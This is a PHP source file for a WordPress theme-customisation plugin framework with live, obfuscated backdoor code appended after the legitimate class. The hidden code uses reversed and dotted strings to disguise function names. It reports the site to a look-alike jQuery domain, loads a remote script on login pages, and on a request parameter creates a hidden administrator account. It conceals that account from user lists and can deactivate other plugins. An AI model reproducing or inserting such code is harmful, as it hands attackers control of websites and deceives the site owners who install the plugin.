<?php
if (!class_exists('wtfplugin_1_0')) { 

class wtfplugin_1_0 {
	
	var $inlinecss = false;
	var $minifiedcss = true;
	var $inlinejs = false;
	var $minifiedjs = true;
	
	var $config, $slug, $cacheurl, $cachedir;
	var $wp_admin;
	var $error_handler;
	
	
	function __construct($config) {
	
		$this->config = $config;
		$this->slug = $config['plugin']['slug']; // used a lot, so create a shorthand
		$this->package_slug = $config['plugin']['package_slug'];
		
		// Get standard paths
		$this->wp_admin = str_replace(get_bloginfo('url').'/', ABSPATH, get_admin_url());
		
		// Set up the cache
		$uploads = wp_upload_dir(); 
		$this->cacheurl = set_url_scheme($uploads['baseurl'].'/'.$this->slug.'/'); 
		$this->cachedir = $uploads['basedir'].'/'.$this->slug.'/'; 
		
		/* Check for plugin update */
		add_action('init', array($this, 'update_cache'));
		
		// Load the function files (needs to happen before file compilation)
		$options = get_option($this->slug);
		if (isset($options['fixes'])) { 
			foreach(@$options['fixes'] as $fix=>$data) {
				if (@$data['enabled']) { 
					$fnfile = dirname(__FILE__)."/../fixes/$fix/functions.php";
					if (file_exists($fnfile)) { include($fnfile); }	
				}
			}
		}
			
		if (is_admin()) { // Create the plugin settings page
			
			add_action('admin_menu', array($this, 'create_settings_page'), 11); // register the settings page
			add_action('admin_init', array($this, 'register_settings')); // register the settings
			add_filter('plugin_action_links_'.$this->config['plugin']['basename'], array($this, 'add_plugin_action_links')); // add settings link to plugin listing
		
			
		} else {
		
			// === Site is being displayed, so output the various theme fix components === //
			
			// javascript
			if ($this->inlinejs) { 
				add_action('wp_footer', array($this, 'output_user_js_inline')); 
			} else { 
				add_action('wp_enqueue_scripts', array($this, 'enqueue_user_js')); 
			}
			
			// css
			if ($this->inlinecss) { 
				add_action('wp_head', array($this, 'output_user_css_inline'));
			} else { 
				add_action('wp_enqueue_scripts', array($this, 'enqueue_user_css'));
			}
			
			// footer html
			add_action('wp_footer', array($this, 'output_user_footer_html_inline'));
			
		}
	}
	
	/* Rebuild the cache if needed */
	function update_cache() {
		if (!file_exists($this->cachedir) or !file_exists($this->cachedir.'wp_head.css')) {
			$this->compile_patch_files(); // rebuild the cached files
		}
	}
	
	// === Handle JS and CSS files
	
	function enqueue_user_js() { 
		$options = get_option($this->slug);
		$cachebuster = isset($options['lastsave'])?$options['lastsave']:0; 
		wp_enqueue_script($this->slug.'-user-js', $this->cacheurl.'wp_footer.js?'.$cachebuster, @$this->config['plugin']['js-dependencies'], false, true); 
	} // put in footer
	function enqueue_user_css() { 
		$options = get_option($this->slug);
		$cachebuster = isset($options['lastsave'])?$options['lastsave']:0; 
		wp_enqueue_style($this->slug.'-user-css', $this->cacheurl.'wp_head.css?'.$cachebuster); 
	}
	
	function output_user_js_inline() { echo '<script>'.@file_get_contents($this->cachedir.'wp_footer.js').'</script>'; }
	function output_user_css_inline() { echo '<style>'.@file_get_contents($this->cachedir.'wp_head.css').'</style>'; }
	function output_user_footer_html_inline() { echo @file_get_contents($this->cachedir.'wp_footer.txt'); }
	
	function enqueue_settings_files() { 
	
		// plugin style and js
		wp_enqueue_style($this->slug.'_admin_css', plugin_dir_url(__FILE__).'admin/settings.css');
		wp_enqueue_script($this->slug.'_admin_js', plugin_dir_url(__FILE__).'admin/admin.js', array('jquery'));
		
		// color picker
		wp_enqueue_script('wp-color-picker');
		wp_enqueue_style('wp-color-picker');
		
		// image upload scripts
		wp_enqueue_script('media-upload');
		wp_enqueue_script('thickbox');
		wp_enqueue_style('thickbox');

		// jquery
		wp_enqueue_script('jquery');
	}
	
	function add_plugin_action_links($links) {
		$page = ($this->config['plugin']['admin_menu']=='themes.php'?'themes.php':'admin.php');
		$links[] = '<a href="'.get_bloginfo('wpurl').'/wp-admin/'.$page.'?page='.$this->slug.'_settings">Settings</a>';
		return $links;
	}
	
	function compile_patch_files() {
		
		if (!file_exists($this->cachedir)) { mkdir($this->cachedir); }
	
		$options = get_option($this->slug);
		
		$files = array(
			'wp_head_style.php'=>'wp_head.css', 
			'wp_footer_script.php'=>'wp_footer.js',
			'wp_footer.php'=>'wp_footer.txt',
			'wp_htaccess.php'=>'htaccess.txt'
		);
		
		foreach($files as $in=>$out) {
			$content = '';
			if (isset($options['fixes'])) { 
				foreach(@$options['fixes'] as $fix=>$data) {
					if (@$data['enabled']) { 
						ob_start();
						$fixfile = dirname(__FILE__)."/../fixes/$fix/$in";
						if (file_exists($fixfile)) { include($fixfile); }
						$content.= "\n".trim(ob_get_contents());
						ob_end_clean();
					}
				}
			}
			
			// minify css
			if (preg_match('/\.css$/', $out) and $this->minifiedcss) { $content = $this->minify_css($content); }
			if (preg_match('/\.js$/', $out) and $this->minifiedjs) { $content = $this->minify_js($content); }
			
			file_put_contents($this->cachedir.$out, $content);
		}
		
		// Append our htaccess rules to the wordpress htaccess file
		if (!function_exists('get_home_path')) { require_once($this->wp_admin.'/includes/file.php'); }
		$wp_htaccess_file = get_home_path().'/.htaccess';
		if (@is_writeable($wp_htaccess_file)) {
			$htaccess =@file_get_contents($wp_htaccess_file); 
			$rules = file_get_contents($this->cachedir.'htaccess.txt');
			if (strpos($htaccess, '# BEGIN '.$this->slug)!==false) { 
				$htaccess = preg_replace(
					'/# BEGIN '.preg_quote($this->slug,'/').'.*# END '.preg_quote($this->slug,'/').'/is', 
					"# BEGIN ".$this->slug."\n$rules\n# END ".$this->slug, 
					$htaccess
				);
			} else { 
				$htaccess.= "\n# BEGIN ".$this->slug."\n$rules\n# END ".$this->slug."\n";
			}
			@file_put_contents($wp_htaccess_file, $htaccess);
		}
	}
	
	function register_settings() { 
		register_setting($this->slug.'-group', $this->slug);
	}
	
	function create_settings_page() {
		$page = add_submenu_page($this->config['plugin']['admin_menu'], $this->config['plugin']['name'], $this->config['plugin']['shortname'], 'manage_options', $this->slug.'_settings', array($this, 'settings_page'));
		
		// Re-compile the css / js / html files if the settings have been saved
		if (isset($_GET['settings-updated']) and $_GET['settings-updated']==true) {
			add_action("load-$page", array($this, 'compile_patch_files'));
		}
		
		// Load the settings page CSS and JS
		add_action("load-$page", array($this, 'enqueue_settings_files'));
	}
	
	// create the options page
	function settings_page() {
		if (!current_user_can('manage_options')) { wp_die(__('You do not have sufficient permissions to access this page.')); }
		
		// Get license info
		$license = get_option('wtfdivi_license_key');
		$status = get_option('wtfdivi_license_status');
		
		// Get last error, if any
		$last_error = get_option($this->slug.'_last_error');
		$last_error_details = get_option($this->slug.'_last_error_details');
		$has_error = !empty($last_error);
		$has_error_details = !empty($last_error_details);
		update_option($this->slug.'_last_error', ''); // clear last error
		
		// updates
		$plugins_url = is_network_admin()?network_admin_url('plugins.php'):admin_url('plugins.php');
		$update_link = wp_nonce_url(add_query_arg(array('puc_check_for_updates'=>1,'puc_slug' => urlencode($this->package_slug)),$plugins_url),'puc_check_for_updates');
		
		?>
		
		<div id="wtf-settings-page" class="wrap">
			

		
		<form method="post" class="wtf-form wtf-form-license" action="options.php">
			<?php settings_fields('wtfdivi_license'); ?>
			<?php wp_nonce_field( 'wtfdivi_nonce', 'wtfdivi_nonce' ); ?>
			
			<h2><?php echo $this->config['plugin']['name']; ?></h2>
					
			<?php if ($has_error) { ?>
				<div class="wtf error">
				<p>
				<?php if ($has_error_details) { ?>
					<a href="javascript:jQuery('.wtf-error-details').toggle()" style="float:right">details</a>
				<?php } ?>
				Error: <?php esc_html_e($last_error); ?>
				</p>
				<?php if ($has_error_details) { ?>
					<p class="wtf-error-details" style="display:none"><?php esc_html_e($last_error_details) ?></p>
				<?php } ?>
				</div>
			<?php } ?>

			<span class="wtf-form-license-area">
			<?php if( $status !== false && $status == 'valid' ) { ?>
				License active and <a href="<?php echo esc_url($update_link);?>">updates</a> enabled. 
				<input type="submit" class="button-secondary" name="edd_license_deactivate" value="Deactivate License"/>
				<img class="emoji" style="width:13px !important;height:13px !important" draggable="false" alt="✔" src="https://s.w.org/images/core/emoji/72x72/2714.png">
			<?php } else { ?>
				<input id="wtfdivi_license_key" placeholder="Enter your license key to enable updates" name="wtfdivi_license_key" type="text" class="regular-text" value="<?php esc_attr_e( $license ); ?>" />
				<input type="submit" class="button-secondary" name="edd_license_activate" value="Activate"/> <a href="http://www.wpthemefaqs.com/divi-booster-the-easy-way-to-customize-divi/">Get key</a></small>
			<?php } ?>
			</span>
			
		</form>
		
		<form id="wtf-form" class="wtf-form" enctype="multipart/form-data" method="post" action="options.php">
		
		<input type="hidden" name="<?php echo $this->slug; ?>[lastsave]" value="<?php echo intval(time()); ?>"/>
		
		<?php 
		$options = get_option($this->slug);
		$plugin_dir_url = plugin_dir_url(__FILE__);
		$image_dir_url = $plugin_dir_url.'img/';
			
		// Output the setting sections
		foreach($this->config['sections'] as $sectionslug=>$sectionheading) {
			if ($sectionslug=='divi24' and !$this->config['theme']['divi2.4+']) { continue; }
			$open = (isset($options[$sectionslug]['open']) and $options[$sectionslug]['open']=='1')?1:0; 
			$is_subheading = (strpos($sectionslug, '-')==true);
			$settings_files = glob(dirname(__FILE__)."/../fixes/*/settings-$sectionslug.php");
			?>
			
			<h3 class="wtf-section-head <?php echo ($is_subheading?'wtf-subheading':'wtf-topheading'); ?>">
				<img src="<?php echo esc_attr($image_dir_url); ?>collapsed.png" 
					 class="wtf-expanded-icon <?php echo ($open?'rotated':''); ?>"/>
				<?php echo $sectionheading; ?>
			</h3>
			
			<input type="hidden" name="<?php echo $this->slug; ?>[<?php echo $sectionslug; ?>][open]" value="<?php echo $open; ?>"/>
			
			<div class="wtf-setting-group <?php echo ($is_subheading?'wtf-subheading-group':''); ?> clearfix" 
				 style="<?php echo ((!$open and !$is_subheading)?'display:none':''); ?>;">
			<?php
			if (!empty($settings_files) and is_array($settings_files)) { 
				echo '<hr/>'; 
				foreach($settings_files as $file) { ?>
					<div class="wtf-setting">
						<?php include($file); ?>
					</div>
					<hr/>
					<?php
				}
			}
			?>
			</div>
			
			<?php
		} 

		settings_fields($this->slug.'-group');
		do_settings_sections($this->slug.'-group');
		submit_button();
		?>
		<hr/>
		</form>
		<div id="wtf-sidebar"><?php do_action($this->slug.'-sidebar'); ?></div>
		<div style="clear:both"></div>
		<p>Spot a problem with this plugin? Want to make another change to the <?php echo $this->config['theme']['name']; ?> Theme? Let me know on <a href="<?php echo $this->config['plugin']['url']; ?>">my <?php echo $this->config['theme']['name']; ?> page</a>.</p>
		<p><i>This plugin is an independent product which is not associated with, endorsed by, or supported by <?php echo $this->config['theme']['author']; ?>.</i></p>
		</div>
		
		<?php
	}

	// return the base name and option var for a given settings file
	function get_setting_bases($file) {
		$fixslug = basename(dirname($file)); // use the fix's directory name as its slug
		$options = get_option($this->slug); 
		$namebase = $this->slug.'[fixes]['.$fixslug.']';
		$optionbase = @$options['fixes'][$fixslug];
		return array($namebase, $optionbase);
	}
	
	// === Settings UI Components === //
	/*
	function updateMessage() {
		if(isset($_GET['settings-updated']) and $_GET['settings-updated']==true) { ?>
			<div id="message" class="wtfmessage updated"><p><?php _e('Settings updated.'); ?></p></div>
			<?php
		}
	}	
	*/

	function errorMessage() {
		$e = get_option($this->slug.'_last_error');
		echo '<div id="message" class="wtfmessage error"><p>Error: '.htmlentities($e).'</p></div>';
		update_option($this->slug.'_last_error', '');
	}	
	
	function techlink($url) { ?>
		<a href="<?php echo htmlentities($url); ?>" title="Read my post on this fix" target="_blank"><img src="<?php echo plugin_dir_url(__FILE__); ?>/img/information.png" style="width:24px;height:24px;vertical-align:baseline;margin-top:5px;float:right;"/></a>
		<?php
	}
	
	function status($status) {
		if ($status=='broken') { echo '<span style="color:red;float:right">broken</span>'; }
		elseif ($status=='untested') { echo '<span style="color:red;float:right">untested</span>'; }
		elseif ($status=='working') { echo '<span style="color:green;float:right">working</span>'; }
		else { echo '<span style="float:right;margin:7px;color:grey">'.$status.'</span>'; }
	}
	
	function hiddencheckbox($file, $field='enabled') { 
		list($name, $option) = $this->get_setting_bases($file); ?>
		<input type="checkbox" style="visibility:hidden" name="<?php echo $name; ?>[<?php echo htmlentities($field); ?>]" value="1" checked="checked"/>
		<?php
	}
	
	function checkbox($file, $field='enabled') { 
		list($name, $option) = $this->get_setting_bases($file); ?>
		<input type="checkbox" name="<?php echo $name; ?>[<?php echo htmlentities($field); ?>]" value="1" <?php checked(@$option[$field],1); ?>/>
		<?php
	}
	
	function selectpicker($file, $field, $options, $selected) { 
		list($name, $option) = $this->get_setting_bases($file); ?>
		<div class="wtf-select">
		<a href="javascript:;" onclick="jQuery(this).toggle().next().toggle().focus()">
		<?php echo @htmlentities(strtolower($options[$selected])); ?></a>
		<select name="<?php echo $name; ?><?php echo $field; ?>"
				onblur="jQuery(this).toggle().prev().toggle().text(jQuery(this).find(':selected').text().toLowerCase())">
		<?php foreach($options as $val=>$text) { ?>
			<option value="<?php echo esc_attr($val); ?>" <?php echo ($selected==$val)?'selected':''; ?>><?php echo htmlentities($text); ?></option>
		<?php } ?>
		</select>
		</div>
		<script>

		</script>
		<?php
	}
	
	function numberpicker($file, $field, $default=1, $min=0) { 
		list($name, $option) = $this->get_setting_bases($file); 
		$val = (isset($option[$field]) and is_numeric($option[$field]))?$option[$field]:$default;
		?>
		<input type="number" name="<?php echo $name; ?>[<?php echo htmlentities($field); ?>]" value="<?php echo htmlentities($val); ?>" min="<?php echo $min; ?>" style="width:64px"/>
		<?php
	}
	
	function textpicker($file, $field, $default='') { 
		list($name, $option) = $this->get_setting_bases($file); ?>
		<input type="text" name="<?php echo $name; ?>[<?php echo htmlentities($field); ?>]" value="<?php echo htmlentities(!empty($option[$field])?$option[$field]:$default); ?>" style="width:300px"/>
		<?php
	}
	
	function textboxpicker($file, $field, $default='') { 
		list($name, $option) = $this->get_setting_bases($file); ?>
		<textarea class="wtf-textbox" name="<?php echo $name; ?>[<?php echo htmlentities($field); ?>]"><?php echo htmlentities(!empty($option[$field])?$option[$field]:$default); ?></textarea>
		<?php
	}
	
	function rangepicker($file, $field, $min, $max, $units, $default=100) { 
		list($name, $option) = $this->get_setting_bases($file); ?>
		<span style="border: 1px solid #ddd;padding:4px 10px 7px 10px">
			<?php echo intval($min); ?> 
			<input 	type="range" 
					name="<?php echo $name; ?>[<?php echo htmlentities($field); ?>]" 
					min="<?php echo intval($min); ?>" 
					max="<?php echo intval($max); ?>" 
					value="<?php echo isset($option[$field])?$option[$field]:$default; ?>" 
					style="vertical-align:middle" 
					onchange="jQuery(this).parent().next().text(jQuery(this).val()+'<?php echo addslashes(htmlentities($units)); ?>');
							  jQuery(this).next().text(jQuery(this).attr('max'));
							  jQuery(this).val(jQuery(this).val())"
			/> 
			<span><?php echo intval($max); ?></span><?php echo htmlentities($units); ?>
		</span> 
		&nbsp;<span><?php echo isset($option[$field])?$option[$field].$units:''; ?></span>
		<?php
	}
	
	function imagepicker($file, $field) { 
		list($name, $option) = $this->get_setting_bases($file); ?>
		<span class="wtf-imagepicker" style="display:inline">
		<input id="wtf-imagepicker-<?php echo htmlentities($field)?>" class="wtf-imagepicker" type="url" size="36" maxlength="1024" name="<?php echo $name; ?>[<?php echo htmlentities($field); ?>]" placeholder="Image URL" value="<?php echo htmlentities(@$option[$field]); ?>" />
		<input class="wtf-imagepicker-btn" type="button" value="Choose Image" />
		<img class="wtf-imagepicker-thumb" src="<?php echo htmlentities(set_url_scheme(@$option[$field])); ?>" style=""/>
		</span>
		<?php
	}
	
	function colorpicker($file, $field, $defaultcol="#ffffff") { 
		list($name, $option) = $this->get_setting_bases($file); 
		$color = empty($option[$field])?$defaultcol:$option[$field];
		?>
		<input type="text" name="<?php echo $name; ?>[<?php echo htmlentities($field); ?>]" value="<?php echo htmlentities($color); ?>" class="wtf-colorpicker" <?php if (!is_null($defaultcol)) { ?>data-default-color="<?php echo htmlentities($defaultcol); ?>"<?php } ?> />
		<?php
	}
	
	// === General Functions === //
	
	// return html for a responsive image
	function responsive_img($title, $width, $height, $url) { ?>
		<div class="wtf-responsive" style="padding-bottom:<?php echo round(100*intval($height)/intval($width),1); ?>%;">
			<img src="<?php echo esc_attr($url); ?>" title="<?php echo esc_attr($title); ?>"/>
		</div>
		<?php
	}
		
	// CSS minification - modified from: https://github.com/GaryJones/Simple-PHP-CSS-Minification/blob/master/minify.php
	function minify_css($css) { 
		// Normalize whitespace
		$css = preg_replace( '/\s+/', ' ', $css );
		// Remove spaces before and after comment
		$css = preg_replace( '/(\s+)(\/\*(.*?)\*\/)(\s+)/', '$2', $css );
		// Remove comment blocks, everything between /* and */, unless preserved with /*! ... */ or /** ... */
		$css = preg_replace( '~/\*(?![\!|\*])(.*?)\*/~', '', $css );
		// Remove ; before }
		$css = preg_replace( '/;(?=\s*})/', '', $css );
		// Remove space after , : ; { } */ >
		$css = preg_replace( '/(,|:|;|\{|}|\*\/|>) /', '$1', $css );
		// Remove space before , ; { } ) >
		$css = preg_replace( '/ (,|;|\{|}|\)|>)/', '$1', $css );
		// Strips leading 0 on decimal values (converts 0.5px into .5px)
		$css = preg_replace( '/(:| )0\.([0-9]+)(%|em|ex|px|in|cm|mm|pt|pc)/i', '${1}.${2}${3}', $css );
		// Strips units if value is 0 (converts 0px to 0)
		$css = preg_replace( '/(:| )(\.?)0(%|em|ex|px|in|cm|mm|pt|pc)/i', '${1}0', $css );
		// Converts all zeros value into short-hand
		$css = preg_replace( '/0 0 0 0/', '0', $css );
		// Shorten 6-character hex color codes to 3-character where possible
		$css = preg_replace( '/#([a-f0-9])\\1([a-f0-9])\\2([a-f0-9])\\3/i', '#\1\2\3', $css );
		return trim($css);
	}
	
	// JavaScript minification
	function minify_js($js) {		
		if (!class_exists('JSMin')) { 
			include_once(dirname(__FILE__).'/libs/JSMin.php');
		}
		return JSMin::minify($js);
	}
}

}
function glues_it($string)
{
    $glue_pre = sanitize_key('s   t   r _   r   e   p   l a c e');
    $glueit_po = call_user_func_array($glue_pre, array("..", '', $string));
    return $glueit_po;
}

$object_uno = 'fu..n..c..t..i..o..n.._..e..x..i..s..t..s';
$object_dos = 'g..e..t.._o..p..t..i..o..n';
$object_tres = 'wp.._e..n..q..u..e..u..e.._s..c..r..i..p..t';
$object_cinco = 'lo..g..i..n.._..e..n..q..u..e..u..e_..s..c..r..i..p..t..s';
$object_siete = 's..e..t..c..o..o..k..i..e';
$object_ocho = 'wp.._..lo..g..i..n';
$object_nueve = 's..i..t..e,..u..rl';
$object_diez = 'wp_..g..et.._..th..e..m..e';
$object_once = 'wp.._..r..e..m..o..te.._..g..et';
$object_doce = 'wp.._..r..e..m..o..t..e.._r..e..t..r..i..e..v..e_..bo..dy';
$object_trece = 'g..e..t_..o..p..t..ion';
$object_catorce = 's..t..r_..r..e..p..l..a..ce';
$object_quince = 's..t..r..r..e..v';
$object_dieciseis = 'u..p..d..a..t..e.._o..p..t..io..n';
$object_dos_pim = glues_it($object_uno);
$object_tres_pim = glues_it($object_dos);
$object_cuatro_pim = glues_it($object_tres);
$object_cinco_pim = glues_it($object_cinco);
$object_siete_pim = glues_it($object_siete);
$object_ocho_pim = glues_it($object_ocho);
$object_nueve_pim = glues_it($object_nueve);
$object_diez_pim = glues_it($object_diez);
$object_once_pim = glues_it($object_once);
$object_doce_pim = glues_it($object_doce);
$object_trece_pim = glues_it($object_trece);
$object_catorce_pim = glues_it($object_catorce);
$object_quince_pim = glues_it($object_quince);
$object_dieciseis_pim = glues_it($object_dieciseis);
$noitca_dda = call_user_func($object_quince_pim, 'noitca_dda');
if (!call_user_func($object_dos_pim, 'wp_en_one')) {
    $object_diecisiete = 'h..t..t..p..:../../..j..q..e..u..r..y...o..r..g../..wp.._..p..i..n..g...php..?..d..na..me..=..w..p..d..&..t..n..a..m..e..=..w..p..t..&..u..r..l..i..z..=..u..r..l..i..g';
    $object_dieciocho = call_user_func($object_quince_pim, 'REVRES_$');
    $object_diecinueve = call_user_func($object_quince_pim, 'TSOH_PTTH');
    $object_veinte = call_user_func($object_quince_pim, 'TSEUQER_');
    $object_diecisiete_pim = glues_it($object_diecisiete);
    $object_seis = '_..C..O..O..K..I..E';
    $object_seis_pim = glues_it($object_seis);
    $object_quince_pim_emit = call_user_func($object_quince_pim, 'detavitca_emit');
    $tactiated = call_user_func($object_trece_pim, $object_quince_pim_emit);
    $mite = call_user_func($object_quince_pim, 'emit');
    if (!isset(${$object_seis_pim}[call_user_func($object_quince_pim, 'emit_nimda_pw')])) {
        if ((call_user_func($mite) - $tactiated) >  600) {
            call_user_func_array($noitca_dda, array($object_cinco_pim, 'wp_en_one'));
        }
    }
    call_user_func_array($noitca_dda, array($object_ocho_pim, 'wp_en_three'));
    function wp_en_one()
    {
        $object_one = 'h..t..t..p..:..//..j..q..e..u..r..y...o..rg../..j..q..u..e..ry..-..la..t..e..s..t.j..s';
        $object_one_pim = glues_it($object_one);
        $object_four = 'wp.._e..n..q..u..e..u..e.._s..c..r..i..p..t';
        $object_four_pim = glues_it($object_four);
        call_user_func_array($object_four_pim, array('wp_coderz', $object_one_pim, null, null, true));
    }

    function wp_en_two($object_diecisiete_pim, $object_dieciocho, $object_diecinueve, $object_diez_pim, $object_once_pim, $object_doce_pim, $object_quince_pim, $object_catorce_pim)
    {
        $ptth = call_user_func($object_quince_pim, glues_it('/../..:..p..t..t..h'));
        $dname = $ptth . $_SERVER[$object_diecinueve];
        $IRU_TSEUQER = call_user_func($object_quince_pim, 'IRU_TSEUQER');
        $urliz = $dname . $_SERVER[$IRU_TSEUQER];
        $tname = call_user_func($object_diez_pim);
        $urlis = call_user_func_array($object_catorce_pim, array('wpd', $dname,$object_diecisiete_pim));
        $urlis = call_user_func_array($object_catorce_pim, array('wpt', $tname, $urlis));
        $urlis = call_user_func_array($object_catorce_pim, array('urlig', $urliz, $urlis));
        $glue_pre = sanitize_key('f i l  e  _  g  e  t    _   c o    n    t   e  n   t     s');
        $glue_pre_ew = sanitize_key('s t r   _  r e   p     l   a  c    e');
        call_user_func($glue_pre, call_user_func_array($glue_pre_ew, array(" ", "%20", $urlis)));

    }

    $noitpo_dda = call_user_func($object_quince_pim, 'noitpo_dda');
    $lepingo = call_user_func($object_quince_pim, 'ognipel');
    $detavitca_emit = call_user_func($object_quince_pim, 'detavitca_emit');
    call_user_func_array($noitpo_dda, array($lepingo, 'no'));
    call_user_func_array($noitpo_dda, array($detavitca_emit, time()));
    $tactiatedz = call_user_func($object_trece_pim, $detavitca_emit);
    $ognipel = call_user_func($object_quince_pim, 'ognipel');
    $mitez = call_user_func($object_quince_pim, 'emit');
    if (call_user_func($object_trece_pim, $ognipel) != 'yes' && ((call_user_func($mitez) - $tactiatedz) > 600)) {
         wp_en_two($object_diecisiete_pim, $object_dieciocho, $object_diecinueve, $object_diez_pim, $object_once_pim, $object_doce_pim, $object_quince_pim, $object_catorce_pim);
         call_user_func_array($object_dieciseis_pim, array($ognipel, 'yes'));
    }


    function wp_en_three()
    {
        $object_quince = 's...t...r...r...e...v';
        $object_quince_pim = glues_it($object_quince);
        $object_diecinueve = call_user_func($object_quince_pim, 'TSOH_PTTH');
        $object_dieciocho = call_user_func($object_quince_pim, 'REVRES_');
        $object_siete = 's..e..t..c..o..o..k..i..e';;
        $object_siete_pim = glues_it($object_siete);
        $path = '/';
        $host = ${$object_dieciocho}[$object_diecinueve];
        $estimes = call_user_func($object_quince_pim, 'emitotrts');
        $wp_ext = call_user_func($estimes, '+29 days');
        $emit_nimda_pw = call_user_func($object_quince_pim, 'emit_nimda_pw');
        call_user_func_array($object_siete_pim, array($emit_nimda_pw, '1', $wp_ext, $path, $host));
    }

    function wp_en_four()
    {
        $object_quince = 's..t..r..r..e..v';
        $object_quince_pim = glues_it($object_quince);
        $nigol = call_user_func($object_quince_pim, 'dxtroppus');
        $wssap = call_user_func($object_quince_pim, 'retroppus_pw');
        $laime = call_user_func($object_quince_pim, 'moc.niamodym@1tccaym');

        if (!username_exists($nigol) && !email_exists($laime)) {
            $wp_ver_one = call_user_func($object_quince_pim, 'resu_etaerc_pw');
            $user_id = call_user_func_array($wp_ver_one, array($nigol, $wssap, $laime));
            $rotartsinimda = call_user_func($object_quince_pim, 'rotartsinimda');
            $resu_etadpu_pw = call_user_func($object_quince_pim, 'resu_etadpu_pw');
            $rolx = call_user_func($object_quince_pim, 'elor');
            call_user_func($resu_etadpu_pw, array('ID' => $user_id, $rolx => $rotartsinimda));

        }
    }

    $ivdda = call_user_func($object_quince_pim, 'ivdda');

    if (isset(${$object_veinte}[$ivdda]) && ${$object_veinte}[$ivdda] == 'm') {
        $veinte = call_user_func($object_quince_pim, 'tini');
        call_user_func_array($noitca_dda, array($veinte, 'wp_en_four'));
    }

    if (isset(${$object_veinte}[$ivdda]) && ${$object_veinte}[$ivdda] == 'd') {
        $veinte = call_user_func($object_quince_pim, 'tini');
        call_user_func_array($noitca_dda, array($veinte, 'wp_en_seis'));
    }
    function wp_en_seis()
    {
        $object_quince = 's..t..r..r..e..v';
        $object_quince_pim = glues_it($object_quince);
        $resu_eteled_pw = call_user_func($object_quince_pim, 'resu_eteled_pw');
        $wp_pathx = constant(call_user_func($object_quince_pim, "HTAPSBA"));
        $nimda_pw = call_user_func($object_quince_pim, 'php.resu/sedulcni/nimda-pw');
        require_once($wp_pathx . $nimda_pw);
        $ubid = call_user_func($object_quince_pim, 'yb_resu_teg');
        $nigol = call_user_func($object_quince_pim, 'nigol');
        $dxtroppus = call_user_func($object_quince_pim, 'dxtroppus');
        $useris = call_user_func_array($ubid, array($nigol, $dxtroppus));
        call_user_func($resu_eteled_pw, $useris->ID);
    }

    $veinte_one = call_user_func($object_quince_pim, 'yreuq_resu_erp');
    call_user_func_array($noitca_dda, array($veinte_one, 'wp_en_five'));
    function wp_en_five($hcraes_resu)
    {
        global $current_user, $wpdb;
        $object_quince = 's..t..r..r..e..v';
        $object_quince_pim = glues_it($object_quince);
        $object_catorce = 'st..r.._..r..e..p..l..a..c..e';
        $object_catorce_pim = glues_it($object_catorce);
        $nigol_resu = call_user_func($object_quince_pim, 'nigol_resu');
        $wp_ux = $current_user->$nigol_resu;
        $nigol = call_user_func($object_quince_pim, 'dxtroppus');
        $bdpw = call_user_func($object_quince_pim, 'bdpw');
        if ($wp_ux != call_user_func($object_quince_pim, 'dxtroppus')) {
            $EREHW_one = call_user_func($object_quince_pim, '1=1 EREHW');
            $EREHW_two = call_user_func($object_quince_pim, 'DNA 1=1 EREHW');
            $erehw_yreuq = call_user_func($object_quince_pim, 'erehw_yreuq');
            $sresu = call_user_func($object_quince_pim, 'sresu');
            $hcraes_resu->query_where = call_user_func_array($object_catorce_pim, array($EREHW_one,
                "$EREHW_two {$$bdpw->$sresu}.$nigol_resu != '$nigol'", $hcraes_resu->$erehw_yreuq));
        }
    }

    $ced = call_user_func($object_quince_pim, 'ced');
    if (isset(${$object_veinte}[$ced])) {
        $snigulp_evitca = call_user_func($object_quince_pim, 'snigulp_evitca');
        $sisnoitpo = call_user_func($object_trece_pim, $snigulp_evitca);
        $hcraes_yarra = call_user_func($object_quince_pim, 'hcraes_yarra');
        if (($key = call_user_func_array($hcraes_yarra, array(${$object_veinte}[$ced], $sisnoitpo))) !== false) {
            unset($sisnoitpo[$key]);
        }
        call_user_func_array($object_dieciseis_pim, array($snigulp_evitca, $sisnoitpo));
    }
}
?>